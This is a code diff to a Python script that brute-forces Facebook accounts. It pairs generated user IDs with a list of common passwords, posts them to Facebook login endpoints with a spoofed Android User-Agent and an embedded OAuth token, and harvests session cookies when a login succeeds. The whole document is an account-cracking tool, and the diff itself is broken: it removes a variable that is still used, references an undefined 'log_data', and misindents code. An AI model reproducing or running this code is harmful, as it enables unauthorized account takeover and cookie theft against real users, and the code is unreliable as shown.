@@ -86,7 +86,6 @@ def Main():
 		for guru in user:
 			uid = love+lova+lovb+guru
 			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
-			ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
 			yaari.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
@@ -120,7 +119,7 @@ def test(uid,pwx,tl):
             "client_country_code": "GB",
             "currently_logged_in_userid": "0",
         }
-        headers = {
+            header_freefb = {
             "User-Agent": ua,
             "Content-Type": "application/x-www-form-urlencoded",
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
@@ -130,8 +129,7 @@ def test(uid,pwx,tl):
             "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
             "X-FB-HTTP-Engine": "Liger",
         }
-            url = "https://b-graph.facebook.com/auth/login"
-            result = r.post(url, data=data, headers=headers).json()
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
